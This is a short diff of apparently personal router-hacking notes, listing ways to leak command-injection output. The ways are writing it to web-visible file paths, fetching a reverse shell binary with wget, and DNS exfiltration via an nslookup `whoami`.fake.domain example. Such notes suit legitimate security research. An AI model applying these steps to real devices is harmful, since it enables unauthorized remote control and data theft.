@@ -2,10 +2,10 @@
 
 
 ### Leads for leaking command output
-- Config the attacker as the DNS server and force the router to issue DNS requests with the command output.  
+- [x] Look for file paths that are displayed within the web interface that command output can be written to.
+- [x] Use `wget` to download reverse shell binary to the router.
+- [ ] Config the attacker as the DNS server and force the router to issue DNS requests with the command output.  
   Like ```nslookup `whoami`.fake.domain```
-- Look for file paths that are displayed within the web interface that command output can be written to.
-- Use `busybox wget` to download reverse shell binary to the router.
 
 
 ### TODOs
